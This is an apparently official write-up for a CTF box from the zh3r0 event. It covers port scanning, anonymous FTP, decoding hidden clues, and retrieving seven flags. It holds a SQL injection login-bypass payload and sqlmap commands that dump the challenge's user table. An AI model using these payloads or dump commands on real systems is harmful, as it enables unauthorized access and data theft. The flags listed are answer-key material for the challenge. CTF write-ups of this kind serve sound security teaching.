# Official Writeup for `Subset of subset of hacking machines challenges`

Author: MrHolmes and DreyAnd(For Web base)

Challenge levels/Flags:


Basic overview: After nmap scanning we see there are 3 Active ports( Active as in responsive ).

```bash
Not shown: 65529 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
99/tcp    open  metagram
324/tcp   open  rpki-rtr-tls
3306/tcp  open  mysql
4994/tcp  open  unknown
42955/tcp open  unknown
```
But after checking and pinging everyport individually we find that Ports are messed up.
There is http hosted on port 22, Which is kind of default for ssh.( This also fooled nmap in thinking its )

```bash
PORT      STATE SERVICE VERSION
22/tcp    open  http    PHP cli server 5.5 or later
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
99/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 70:78:8f:70:79:59:72:5f:05:c9:2a:63:b4:34:c1:52 (RSA)
|   256 08:6d:42:16:2a:47:ae:b4:d7:fa:35:28:91:67:ab:63 (ECDSA)
|_  256 e4:89:6b:09:37:64:c2:47:01:bd:c2:32:d8:cd:06:2d (EdDSA)
324/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            22 Jun 16 23:45 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:127.0.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
3306/tcp  open  mysql   MySQL 5.7.30-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.30-0ubuntu0.18.04.1
|   Thread ID: 1265881
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolOld, ConnectWithDatabase, SupportsLoadDataLocal, Support41Auth, SupportsCompression, SupportsTransactions, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSigpipes, FoundRows, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, ODBCClient, LongColumnFlag, LongPassword, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x16]\x15\x08v+_\x01dUt\x12\x17m\x1B/E0&.
|_  Auth Plugin Name: 96
4994/tcp  open  unknown
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions: 
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     ||Employee Entry||
|     ----------------------------------------------------------
|     Sherlock Holmes Inc.
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     Here's a free flag for you, just for finding this door! Flag 1: zh3r0{pr05_d0_full_sc4n5}
|     Heyo, Watcha looking at? Employee ID yoo! : 
|     away kiddo, huh, Kids these days!
|   NULL: 
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     ||Employee Entry||
|     ----------------------------------------------------------
|     Sherlock Holmes Inc.
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     Here's a free flag for you, just for finding this door! Flag 1: zh3r0{pr05_d0_full_sc4n5}
|_    Heyo, Watcha looking at? Employee ID yoo! :
42955/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Wed, 17 Jun 2020 16:13:26 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|     404: Page Not Found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Date: Wed, 17 Jun 2020 16:13:01 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|_    404: Page Not Found

```

Now let's check every port.
### Flag 1: 
It is clearly visible in the nmap scan of port 4994, that there is some sort of authenticator service running, and this is kind of a free flag just for finding this port entry.<br />
		FLAG: zh3r0{pr05_d0_full_sc4n5}<br />


### Flag 2:
Let's check that FTP protocol on port 324. <br />
As it is anonymous enabled, We can just login using anonymous and anonymous as user:password<br />

```bash
λ ftp hackit.zh3r0.ml 324
Connected to hackit.zh3r0.ml.
220 (vsFTPd 3.0.3)
Name (hackit.zh3r0.ml:sherlock): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
500 Illegal PORT command.
500 Unknown command.
ftp: bind: Address already in use
ftp> passive
Passive mode on.
ftp> ls -al
227 Entering Passive Mode (139,59,3,42,251,112).
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 23:45 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 23:45 ..
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 23:45 ...
-rw-r--r--    1 ftp      ftp            22 Jun 16 23:45 test.txt
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -al
227 Entering Passive Mode (139,59,3,42,122,94).
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 23:45 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 23:45 ..
drwxr-xr-x    2 ftp      ftp          4096 Jun 16 23:45 ...
-rw-r--r--    1 ftp      ftp            46 Jun 16 23:45 .stayhidden
-rw-r--r--    1 ftp      ftp            22 Jun 16 23:45 test.txt
226 Directory send OK.
ftp> get .stayhidden
227 Entering Passive Mode (139,59,3,42,91,115).
150 Opening BINARY mode data connection for .stayhidden (46 bytes).
226 Transfer complete.
46 bytes received in 0.000608 seconds (73.9 kbytes/s)
ftp> cd ...
250 Directory successfully changed.
ftp> ls -al
227 Entering Passive Mode (139,59,3,42,46,217).
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16 23:45 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 23:45 ..
-rw-r--r--    1 ftp      ftp            34 Jun 16 23:45 .flag
-rw-r--r--    1 ftp      ftp            22 Jun 16 23:45 test.txt
226 Directory send OK.
ftp> get .flag
227 Entering Passive Mode (139,59,3,42,248,1).
150 Opening BINARY mode data connection for .flag (34 bytes).
226 Transfer complete.
34 bytes received in 0.000817 seconds (40.6 kbytes/s)
ftp> 
```
Here we get one clue and one flag. <br />
Flag: zh3r0{You_know_your_shit} <br />



### Flag 4:
Flags are out of order, So let's solve as we get them. <br />
Now we try to ping the port at 4994 with netcat. <br />
`nc hackit.zh3r0.ml 4994`<br />
We can see that it is asking for ID,<br />
After submitting the clue from FTP (.stayhidden)<br />
zh3r0{y0ur_s4l4ry_wa5_cr3dit3d}


### Flag 5:
Now let's try to enumerate port 22.<br />
Since we know its a http, but heres the trick part, if you try to run this http.<br />
`https://hackit.zh3r0.ml:22`<br />
For now, We can just try to make a curl request on the port:<br />
`curl hackit.zh3r0.ml:22`<br />
And we get a flag.<br />
z3hr0{shouldve_added_some_filter_here}



### Flag 3:
Now, Lets look around port 22 a bit more. <br />
What is one of the first things to do at a webpage you are pentesting? <br />
Yes we look for robots.txt to see if admin is trying to hide something from crawlers.<br />
And yes, There's something interesting there!<br />
`curl hackit.zh3r0.ml:22/robots.txt` <br />
`Hmmm you shouldnt be here.... 2yryYz3sx16kWt72agdFZJqxZ5kqqvocsnU416bULtVs63Cvwmvr6f34Ck8sSHQU1PPnQqD7bqW9q    By the way did you see any ads on this thing?`<br />

Hmm Interesting, so we put the cipher text on cyberchef and use magic module.<br />
Turns out its base58! <br />
Decoded: `I tried to hide this, anyway, check out /clue3349203.txt	`<br />

Now, curling on that file <br />
`curl hackit.zh3r0.ml:22/clue3349203.txt` <br />
We get a bunch of jsFuck encoded text.  <br />
Putting in console of browser revealed another Employee ID. <br />

`console.log('Employee ID: 865151c643cbbb7e3bf4fd5dbb71354e') ` <br />
And since we know what to do with these IDs, We submit it on authenticator port to get another flag: <br />
zh3r0{y0ur_b0nu5_i5_p4id}<br />



### Flag 6:
Lets read the second part of robots.txt, It says: <br />
` Have you seen any ads on this thing.`<br />
Another very common possibilty, ads.txt is a very common file on most of the commercial sites.<br />
So we try to read it. <br />
`curl hackit.zh3r0.ml:22/ads.txt` <br />
And we get this:<br />
`Ah shit, You here again?.... OqoQKHWKR3i39YYI2BbKtL9gdfBWV3Ge1tgJeZ53EhQE0H1yIKR0NTJkKJsbhjKmCdgoNT3h4b8uZ6DLiD95aJGJYJPedaDcgm` <br />

So, same process again, We put the cipher in Cyberchef, we see that its base62. And it points us to another file!<br />
`/index2.html` <br />
But its port 22. If we run this in browser, It will just show UNSAFE PORT. Because firefox thinks that port is only for SSH.<br />
So, there are many workarounds on internet, we are gonna do easiest and safest one.<br />
`sudo apt install lynx`<br />
This is a commandline based browser.<br />
In this we can see that it is a login page.<br />
So, How do we bypass a login page?<br />
First trick in the book, We try to do SQL injection!<br />
SQL PAYLOAD TESTED: <br />
username: `-3960' OR 6349=6349-- -` and password ` ` <br />
And it works!<br />
But Ah, Another cipher, <br />
But There's an announcement that the name of cipher is same as a name of a demigod.<br />
So, after looking around we can find that its a Pollux Cipher ( A famous demigod ) <br />
After decoding it, We get another employee ID, as usual we submit it on authenticator port and get a flag! <br />
Flag: zh3r0{wasnt_this_awesomeee} <br />


### Flag 7:

Now, as we can see that on every service there are more then one flag, So we try probing around port 22.<br />
And Since we know this site/page/port is vulnerable to sqlInjection, Why not try to retrieve database using sqlmap? <br /><br />

So, we fire sqlmap on this:<br />
`sqlmap -u "hackit.zh3r0.ml:22/login.php" --form --level 5 --risk 3`<br /><br />

This tells us that the webpage is vulnerable to blind and time based sql injections.<br />
So we try the following command to get the databases.<br /><br />

`sqlmap -u "hackit.zh3r0.ml:22/login.php" --method POST --data "username=-3960' OR 6349=6349-- -&password=" -p username --dbs --dbms mysql --level 5 --risk 3`<br /><br />

This gives us information about a weird database called `challenge` <br />
 Now we try to dump the table and content using this query: <br /><br />
 `sqlmap -u "hackit.zh3r0.ml:22/login.php" --method POST --data "username=-3960' OR 6349=6349-- -&password=" -p username --dump -D challenge -T users --dbms mysql --level 5 --risk 3`<br /><br />
 And Voila, We can see a table entry as flag!<br /><br />
 Flag: zh3r0{Dangit_you_are_good!}
 
 --------------------------------------------------------------------------------------------------------
 
 It was an amazing experience to make a box like this. <br />
 If you have any queries or suggesions you can reach out to me on twitter: https://twitter.com/\_\_MrHolmes
 
 
 
 
